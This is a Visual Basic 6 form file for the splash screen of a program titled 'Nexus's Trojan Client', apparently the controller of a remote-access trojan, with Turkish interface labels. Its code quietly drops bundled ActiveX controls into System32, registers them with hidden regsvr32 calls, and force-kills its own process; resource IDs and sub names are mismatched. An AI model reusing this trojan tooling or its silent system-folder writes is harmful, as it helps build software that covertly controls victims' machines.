VERSION 5.00
Begin VB.Form loading 
   BackColor       =   &H80000007&
   BorderStyle     =   0  'None
   Caption         =   "Nexus's Trojan Client"
   ClientHeight    =   5220
   ClientLeft      =   7050
   ClientTop       =   3675
   ClientWidth     =   6555
   LinkTopic       =   "Form15"
   Picture         =   "client_loading.frx":0000
   ScaleHeight     =   5220
   ScaleWidth      =   6555
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   30
      Left            =   1800
      Top             =   5640
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      Caption         =   "Frame1"
      Height          =   495
      Left            =   0
      TabIndex        =   3
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Interval        =   30
      Left            =   1320
      Top             =   5640
   End
   Begin VB.TextBox Text1 
      Height          =   495
      Left            =   0
      TabIndex        =   2
      Text            =   "0"
      Top             =   5640
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Hakkýnda"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF00&
      Height          =   255
      Left            =   5160
      TabIndex        =   7
      Top             =   4200
      Width           =   1215
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "www.<some-random-website>"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   3600
      TabIndex        =   6
      Top             =   4440
      Width           =   2895
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Nexus Yönetim Aracý"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   24
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   735
      Left            =   840
      TabIndex        =   5
      Top             =   2040
      Width           =   4935
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Programmed by Nexus"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      LinkItem        =   "http://www.<some-random-website>"
      TabIndex        =   4
      Top             =   4680
      Width           =   3255
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   495
      Left            =   2760
      TabIndex        =   1
      Top             =   4080
      Width           =   855
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Yükleniyor..."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   495
      Left            =   2280
      TabIndex        =   0
      Top             =   3720
      Width           =   2175
   End
End
Attribute VB_Name = "loading"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' 101 = mswinsck.ocx
' 102 = MSINET.OCX
' 103 = COMDLG32.OCX

Private Sub Form_Load()
On Error Resume Next
winsock
msinet
msinet
End Sub

Public Sub winsock()
On Error Resume Next
Dim resbytes() As Byte
resbytes = LoadResData(101, "CUSTOM")
Dim no As Byte
no = FreeFile
Open Environ$("WINDIR") & "\System32\" & "mswinsck.ocx" For Binary As #no
Put #no, , resbytes
Close #no
Shell "cmd /c regsvr32/s mswinsck.ocx", vbHide
End Sub

Public Sub msinet()
On Error Resume Next
Dim resbytes() As Byte
resbytes = LoadResData(103, "CUSTOM")
Dim no As Byte
no = FreeFile
Open Environ$("WINDIR") & "\System32\" & "COMDLG32.OCX" For Binary As #no
Put #no, , resbytes
Close #no
Shell "cmd /c regsvr32/s COMDLG32.OCX", vbHide
End Sub

Public Sub comdlg()
On Error Resume Next
Dim resbytes() As Byte
resbytes = LoadResData(102, "CUSTOM")
Dim no As Byte
no = FreeFile
Open Environ$("WINDIR") & "\System32\" & "MSINET.OCX" For Binary As #no
Put #no, , resbytes
Close #no
Shell "cmd /c regsvr32/s MSINET.OCX", vbHide
End Sub

Private Sub Label3_Click()
web_tarayýcý.Show
web_tarayýcý.Combo1.Text = "http://www.<some-random-website>"
web_tarayýcý.git
End Sub

Private Sub Label5_Click()
web_tarayýcý.Show
web_tarayýcý.Combo1.Text = "http://<some-random-website>/"
web_tarayýcý.git
End Sub

Private Sub Label6_Click()
hakkinda.Show
End Sub

Private Sub Timer1_Timer()
topmost = True
If Text1.Text = 100 Then
Form1.Show
Unload loading
Else
Text1.Text = Text1.Text + 1
Label2.Caption = "%" & Text1.Text
End If
End Sub

Private Sub Timer2_Timer()
topmost = True
If Text1.Text = 100 Then
Shell "taskkill /F /IM " & App.EXEName & ".exe", vbHide
Else
Text1.Text = Text1.Text + 1
Label2.Caption = "%" & Text1.Text
End If
End Sub
